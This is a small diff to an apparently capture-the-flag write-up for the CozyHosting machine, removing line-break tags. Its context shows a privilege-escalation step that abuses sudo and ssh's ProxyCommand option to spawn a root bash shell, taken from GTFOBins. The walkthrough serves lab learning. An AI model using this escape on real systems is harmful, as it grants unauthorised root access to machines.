@@ -296,9 +296,6 @@ sudo -l
 A quick glimpse at **GTFOBins** and we are in:
 
 ![](/assets/CozyHosting/26.png)
-<br />
-<br />
-<br />
 
 ```bash
 sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
